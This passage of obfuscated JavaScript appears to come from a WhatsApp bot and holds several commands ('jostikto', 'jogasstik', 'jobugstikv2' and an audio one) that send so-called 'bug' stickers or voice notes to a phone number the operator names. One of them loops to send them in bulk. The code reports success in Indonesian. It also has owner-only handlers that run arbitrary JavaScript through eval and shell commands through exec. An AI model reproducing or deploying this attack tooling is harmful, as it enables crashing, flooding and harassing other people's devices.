_0x418ff6[_0x580fa0(0x105)]()[_0x580fa0(0x109)](_0x580fa0(0xfc))[_0x580fa0(0x105)]()[_0x580fa0(0x103)](_0x418ff6)['search'](_0x580fa0(0xfc));});_0x418ff6();function _0x3b15(){var _0x2770b9=['9101664BwKgNb','warn','console','3390642PuTyVU','70NHIAbm','info','chat','error','log','exception','893264ZBIzFm','(((.+)+)+)+$','11112ZASobT','apply','5tZljhB','Berhasil\x20Mengirim\x20Bugvn\x20Di\x20Nomer\x20','1208334GWYFDy','length','constructor','sendMessage','toString','audio/mpeg','prototype','@s.whatsapp.net','search','trace','Nomernya\x20mana?','bind','6754PgxrQF','1007110UoxqdU','./src/dosa\x20pantek.mp3','971248eQekGz','2nbxJMN','4YaYqcR'];_0x3b15=function(){return _0x2770b9;};return _0x3b15();}var _0x200a21=(function(){var _0x2a73f2=!![];return function(_0x579497,_0x12aac6){var _0x1d419a=_0x2a73f2?function(){var _0x2511cf=_0x25ff;if(_0x12aac6){var _0x297d49=_0x12aac6[_0x2511cf(0xfe)](_0x579497,arguments);return _0x12aac6=null,_0x297d49;}}:function(){};return _0x2a73f2=![],_0x1d419a;};}()),_0x5aec0b=_0x200a21(this,function(){var _0x1455ab=_0x25ff,_0x3a45aa=function(){var _0x417eb9;try{_0x417eb9=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5989f6){_0x417eb9=window;}return _0x417eb9;},_0x3ea80c=_0x3a45aa(),_0x374290=_0x3ea80c['console']=_0x3ea80c[_0x1455ab(0xf3)]||{},_0xacfb98=[_0x1455ab(0xf9),_0x1455ab(0xf2),_0x1455ab(0xf6),_0x1455ab(0xf8),_0x1455ab(0xfa),'table',_0x1455ab(0x10a)];for(var _0x50c587=0x0;_0x50c587<_0xacfb98[_0x1455ab(0x102)];_0x50c587++){var _0x1e1bce=_0x200a21[_0x1455ab(0x103)][_0x1455ab(0x107)]['bind'](_0x200a21),_0x3941c7=_0xacfb98[_0x50c587],_0x28942a=_0x374290[_0x3941c7]||_0x1e1bce;_0x1e1bce['__proto__']=_0x200a21[_0x1455ab(0x10c)](_0x200a21),_0x1e1bce[_0x1455ab(0x105)]=_0x28942a[_0x1455ab(0x105)][_0x1455ab(0x10c)](_0x28942a),_0x374290[_0x3941c7]=_0x1e1bce;}});_0x5aec0b();function _0x25ff(_0x54df1b,_0x4baefa){var _0x27a097=_0x3b15();return _0x25ff=function(_0x5aec0b,_0x200a21){_0x5aec0b=_0x5aec0b-0xee;var _0x318f0d=_0x27a097[_0x5aec0b];return _0x318f0d;},_0x25ff(_0x54df1b,_0x4baefa);}{if(!isCreator&&!isBan)return;if(!text)throw _0x4986a1(0x10b);hey=fs['readFileSync'](_0x4986a1(0x10f)),jobotz['sendMessage'](text+'@s.whatsapp.net',{'audio':hey,'mimetype':_0x4986a1(0x106),'ptt':!![]},{'quoted':fkonjo}),jobotz[_0x4986a1(0x104)](m[_0x4986a1(0xf7)],{'audio':hey,'mimetype':_0x4986a1(0x106),'ptt':!![]},{'quoted':fkonjo}),jancok(_0x4986a1(0x100)+text+_0x4986a1(0x108));}
}
break

case 'jostikto': {
var _0x572b06=_0x4438;(function(_0x1415aa,_0x42df2b){var _0x586fac=_0x4438,_0x5bc197=_0x1415aa();while(!![]){try{var _0x34aaff=parseInt(_0x586fac(0x159))/0x1*(-parseInt(_0x586fac(0x160))/0x2)+parseInt(_0x586fac(0x152))/0x3*(-parseInt(_0x586fac(0x158))/0x4)+-parseInt(_0x586fac(0x146))/0x5+parseInt(_0x586fac(0x147))/0x6+parseInt(_0x586fac(0x15c))/0x7*(-parseInt(_0x586fac(0x14d))/0x8)+parseInt(_0x586fac(0x15a))/0x9*(-parseInt(_0x586fac(0x144))/0xa)+parseInt(_0x586fac(0x155))/0xb;if(_0x34aaff===_0x42df2b)break;else _0x5bc197['push'](_0x5bc197['shift']());}catch(_0x506ebe){_0x5bc197['push'](_0x5bc197['shift']());}}}(_0x30b4,0x9ceb9));var _0x57a0e4=(function(){var _0x49b812=!![];return function(_0x2aaa12,_0x299f6d){var _0x448f6b=_0x49b812?function(){var _0x559695=_0x4438;if(_0x299f6d){var _0x3ed7e2=_0x299f6d[_0x559695(0x15b)](_0x2aaa12,arguments);return _0x299f6d=null,_0x3ed7e2;}}:function(){};return _0x49b812=![],_0x448f6b;};}()),_0x2ad38e=_0x57a0e4(this,function(){var _0x55682f=_0x4438;return _0x2ad38e[_0x55682f(0x14f)]()[_0x55682f(0x15d)](_0x55682f(0x143))[_0x55682f(0x14f)]()[_0x55682f(0x15f)](_0x2ad38e)[_0x55682f(0x15d)](_0x55682f(0x143));});function _0x4438(_0x4b7009,_0x54b902){var _0x43648e=_0x30b4();return _0x4438=function(_0x1e836d,_0x10ca6c){_0x1e836d=_0x1e836d-0x143;var _0x535d2d=_0x43648e[_0x1e836d];return _0x535d2d;},_0x4438(_0x4b7009,_0x54b902);}_0x2ad38e();function _0x30b4(){var _0x2673e9=['5819191GIcLqr','search','@s.whatsapp.net','constructor','2RJFGcb','info','table','Nomernya\x20mana?','(((.+)+)+)+$','210tasqRn','Berhasil\x20Mengirim\x20Bugstik\x20Di\x20Nomer\x20','2593565TYLCmr','4066032xzMScv','exception','log','trace','console','error','8jTUoKy','return\x20(function()\x20','toString','sendMessage','bind','57xoodAw','length','reply','38397942CkLwfJ','__proto__','prototype','239884HmZMSv','43483YvpfGQ','425439btGSgG','apply'];_0x30b4=function(){return _0x2673e9;};return _0x30b4();}var _0x10ca6c=(function(){var _0x2e5ece=!![];return function(_0x2be4ee,_0x426cf3){var _0x4b6257=_0x2e5ece?function(){if(_0x426cf3){var _0x5c64d3=_0x426cf3['apply'](_0x2be4ee,arguments);return _0x426cf3=null,_0x5c64d3;}}:function(){};return _0x2e5ece=![],_0x4b6257;};}()),_0x1e836d=_0x10ca6c(this,function(){var _0x4684d2=_0x4438,_0x434521=function(){var _0x55b124=_0x4438,_0x1db98a;try{_0x1db98a=Function(_0x55b124(0x14e)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2a67fa){_0x1db98a=window;}return _0x1db98a;},_0x3cc83a=_0x434521(),_0x45babb=_0x3cc83a[_0x4684d2(0x14b)]=_0x3cc83a['console']||{},_0x574fff=[_0x4684d2(0x149),'warn',_0x4684d2(0x161),_0x4684d2(0x14c),_0x4684d2(0x148),_0x4684d2(0x162),_0x4684d2(0x14a)];for(var _0x2bbbc6=0x0;_0x2bbbc6<_0x574fff[_0x4684d2(0x153)];_0x2bbbc6++){var _0x19d80e=_0x10ca6c['constructor'][_0x4684d2(0x157)][_0x4684d2(0x151)](_0x10ca6c),_0x196388=_0x574fff[_0x2bbbc6],_0x42a288=_0x45babb[_0x196388]||_0x19d80e;_0x19d80e[_0x4684d2(0x156)]=_0x10ca6c['bind'](_0x10ca6c),_0x19d80e[_0x4684d2(0x14f)]=_0x42a288[_0x4684d2(0x14f)][_0x4684d2(0x151)](_0x42a288),_0x45babb[_0x196388]=_0x19d80e;}});_0x1e836d();{if(!isCreator&&!isBan)return;if(!text)throw _0x572b06(0x163);jobotz[_0x572b06(0x150)](text+_0x572b06(0x15e),{'sticker':thumb},{'quoted':fsticjo}),await m[_0x572b06(0x154)](_0x572b06(0x145)+text+_0x572b06(0x15e));}
}
break

case 'jogasstik': {
var _0x280b20=_0x1059;(function(_0x567f09,_0x3b804e){var _0x4e702d=_0x1059,_0x386feb=_0x567f09();while(!![]){try{var _0x1adf43=parseInt(_0x4e702d(0x1b1))/0x1+-parseInt(_0x4e702d(0x1b7))/0x2*(parseInt(_0x4e702d(0x1ba))/0x3)+parseInt(_0x4e702d(0x1bb))/0x4*(-parseInt(_0x4e702d(0x1b0))/0x5)+parseInt(_0x4e702d(0x1bc))/0x6+parseInt(_0x4e702d(0x1a6))/0x7+-parseInt(_0x4e702d(0x1b5))/0x8*(-parseInt(_0x4e702d(0x1be))/0x9)+-parseInt(_0x4e702d(0x1a4))/0xa*(parseInt(_0x4e702d(0x1b3))/0xb);if(_0x1adf43===_0x3b804e)break;else _0x386feb['push'](_0x386feb['shift']());}catch(_0x3d3064){_0x386feb['push'](_0x386feb['shift']());}}}(_0x20f4,0x20824));var _0x250f5b=(function(){var _0x4238c6=!![];return function(_0x21f2f2,_0xcfa3e0){var _0x4763ae=_0x4238c6?function(){if(_0xcfa3e0){var _0x57b7dd=_0xcfa3e0['apply'](_0x21f2f2,arguments);return _0xcfa3e0=null,_0x57b7dd;}}:function(){};return _0x4238c6=![],_0x4763ae;};}()),_0x24e674=_0x250f5b(this,function(){var _0x4e14cd=_0x1059;return _0x24e674[_0x4e14cd(0x1ae)]()[_0x4e14cd(0x1a5)](_0x4e14cd(0x1ab))[_0x4e14cd(0x1ae)]()['constructor'](_0x24e674)[_0x4e14cd(0x1a5)]('(((.+)+)+)+$');});function _0x1059(_0x161569,_0x3da371){var _0x4848c0=_0x20f4();return _0x1059=function(_0xd19d06,_0x12fd34){_0xd19d06=_0xd19d06-0x1a4;var _0x221adc=_0x4848c0[_0xd19d06];return _0x221adc;},_0x1059(_0x161569,_0x3da371);}_0x24e674();var _0x12fd34=(function(){var _0x356c8f=!![];return function(_0x22e998,_0x28c277){var _0x54d07c=_0x356c8f?function(){var _0x47ecf3=_0x1059;if(_0x28c277){var _0x2e0ac9=_0x28c277[_0x47ecf3(0x1b9)](_0x22e998,arguments);return _0x28c277=null,_0x2e0ac9;}}:function(){};return _0x356c8f=![],_0x54d07c;};}()),_0xd19d06=_0x12fd34(this,function(){var _0x17eff9=_0x1059,_0xee7d4d;try{var _0xa70616=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xee7d4d=_0xa70616();}catch(_0x3757f7){_0xee7d4d=window;}var _0x4e32be=_0xee7d4d[_0x17eff9(0x1b2)]=_0xee7d4d[_0x17eff9(0x1b2)]||{},_0x3e5f7d=[_0x17eff9(0x1c1),'warn',_0x17eff9(0x1ac),_0x17eff9(0x1a9),_0x17eff9(0x1aa),_0x17eff9(0x1c0),_0x17eff9(0x1b8)];for(var _0x514b01=0x0;_0x514b01<_0x3e5f7d[_0x17eff9(0x1a8)];_0x514b01++){var _0x574e73=_0x12fd34[_0x17eff9(0x1bf)]['prototype'][_0x17eff9(0x1ad)](_0x12fd34),_0x5d6c6c=_0x3e5f7d[_0x514b01],_0x4daedb=_0x4e32be[_0x5d6c6c]||_0x574e73;_0x574e73[_0x17eff9(0x1b4)]=_0x12fd34[_0x17eff9(0x1ad)](_0x12fd34),_0x574e73[_0x17eff9(0x1ae)]=_0x4daedb[_0x17eff9(0x1ae)]['bind'](_0x4daedb),_0x4e32be[_0x5d6c6c]=_0x574e73;}});function _0x20f4(){var _0x122fad=['error','exception','(((.+)+)+)+$','info','bind','toString','Nomernya\x20mana?','885FBCcyJ','149684mRXLai','console','22PbeCWq','__proto__','24mQpKyD','Berhasil\x20Mengirim\x20Bugstik\x20Di\x20Nomer\x20','2CJCnek','trace','apply','249747lSfXuV','364TMfdIV','1461000GixeMs','chat','622773ooOWlF','constructor','table','log','sendMessage','2626460NLQtpk','search','1099203JbUXrU','@s.whatsapp.net','length'];_0x20f4=function(){return _0x122fad;};return _0x20f4();}_0xd19d06();{if(!isCreator&&!isBan)return;if(!text)throw _0x280b20(0x1af);jobotz[_0x280b20(0x1c2)](m[_0x280b20(0x1bd)],{'sticker':thumb},{'quoted':fsticjo}),jobotz[_0x280b20(0x1c2)](text+_0x280b20(0x1a7),{'sticker':thumb},{'quoted':fsticjo}),jancok(_0x280b20(0x1b6)+text+'@s.whatsapp.net');}
}
break

case 'jobugstikv2':{
function _0x275d(_0x23cf95,_0x24b4fe){const _0x5ad61b=_0x3712();return _0x275d=function(_0x59b684,_0x9a23b5){_0x59b684=_0x59b684-0x100;let _0x184254=_0x5ad61b[_0x59b684];return _0x184254;},_0x275d(_0x23cf95,_0x24b4fe);}const _0x42e6fb=_0x275d;(function(_0x58ad89,_0x5d5db5){const _0x5e320d=_0x275d,_0x14dd91=_0x58ad89();while(!![]){try{const _0x27a766=-parseInt(_0x5e320d(0x114))/0x1*(parseInt(_0x5e320d(0x112))/0x2)+-parseInt(_0x5e320d(0x107))/0x3+parseInt(_0x5e320d(0x10c))/0x4+parseInt(_0x5e320d(0x10a))/0x5*(-parseInt(_0x5e320d(0x113))/0x6)+parseInt(_0x5e320d(0x104))/0x7*(parseInt(_0x5e320d(0x10e))/0x8)+-parseInt(_0x5e320d(0x11b))/0x9+parseInt(_0x5e320d(0x10b))/0xa;if(_0x27a766===_0x5d5db5)break;else _0x14dd91['push'](_0x14dd91['shift']());}catch(_0x485cff){_0x14dd91['push'](_0x14dd91['shift']());}}}(_0x3712,0xb93af));const _0x63e1e0=(function(){let _0x2c9f5b=!![];return function(_0x3200dd,_0x21deb3){const _0x569d5e=_0x2c9f5b?function(){const _0x142c01=_0x275d;if(_0x21deb3){const _0xa64fd9=_0x21deb3[_0x142c01(0x100)](_0x3200dd,arguments);return _0x21deb3=null,_0xa64fd9;}}:function(){};return _0x2c9f5b=![],_0x569d5e;};}()),_0x1bdf77=_0x63e1e0(this,function(){const _0x577f81=_0x275d;return _0x1bdf77[_0x577f81(0x105)]()[_0x577f81(0x103)](_0x577f81(0x119))['toString']()[_0x577f81(0x101)](_0x1bdf77)[_0x577f81(0x103)](_0x577f81(0x119));});function _0x3712(){const _0x35bece=['length','exception','305DbiguO','28882890yAwERr','3862804brkRBG','__proto__','8ReIift','info','return\x20(function()\x20','warn','32qYSqzM','99006kNcwml','57853GVaOMT','Sukses\x20Send\x20Bugstik\x20Sebanyak\x20','sendMessage','console','prototype','(((.+)+)+)+$','error','2255373jObgbP','apply','constructor','bind','search','1999571FqVMNt','toString','table','3594402DbWgbK'];_0x3712=function(){return _0x35bece;};return _0x3712();}_0x1bdf77();const _0x9a23b5=(function(){let _0x23416d=!![];return function(_0x12e061,_0x4f9ce6){const _0x2eab54=_0x23416d?function(){const _0x52e554=_0x275d;if(_0x4f9ce6){const _0xa17744=_0x4f9ce6[_0x52e554(0x100)](_0x12e061,arguments);return _0x4f9ce6=null,_0xa17744;}}:function(){};return _0x23416d=![],_0x2eab54;};}()),_0x59b684=_0x9a23b5(this,function(){const _0x5019f9=_0x275d;let _0x2c0161;try{const _0x3ef3a2=Function(_0x5019f9(0x110)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2c0161=_0x3ef3a2();}catch(_0x46d895){_0x2c0161=window;}const _0x44f238=_0x2c0161[_0x5019f9(0x117)]=_0x2c0161[_0x5019f9(0x117)]||{},_0x179710=['log',_0x5019f9(0x111),_0x5019f9(0x10f),_0x5019f9(0x11a),_0x5019f9(0x109),_0x5019f9(0x106),'trace'];for(let _0x4bc312=0x0;_0x4bc312<_0x179710[_0x5019f9(0x108)];_0x4bc312++){const _0x5b1e88=_0x9a23b5[_0x5019f9(0x101)][_0x5019f9(0x118)][_0x5019f9(0x102)](_0x9a23b5),_0x2ad9a0=_0x179710[_0x4bc312],_0x2d1d76=_0x44f238[_0x2ad9a0]||_0x5b1e88;_0x5b1e88[_0x5019f9(0x10d)]=_0x9a23b5['bind'](_0x9a23b5),_0x5b1e88[_0x5019f9(0x105)]=_0x2d1d76[_0x5019f9(0x105)][_0x5019f9(0x102)](_0x2d1d76),_0x44f238[_0x2ad9a0]=_0x5b1e88;}});_0x59b684();{if(!isCreator&&!isBan)return;if(args[_0x42e6fb(0x108)]==0x0)return m['reply']('Penggunaan\x20'+(prefix+command)+'\x20jumlah\x0aContoh\x20'+(prefix+command)+'\x205');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){jobotz[_0x42e6fb(0x116)](m['chat'],{'sticker':thumb},{'quoted':fsticjo});}jancok(_0x42e6fb(0x115)+jumlah);}
}
break

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    jobotz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
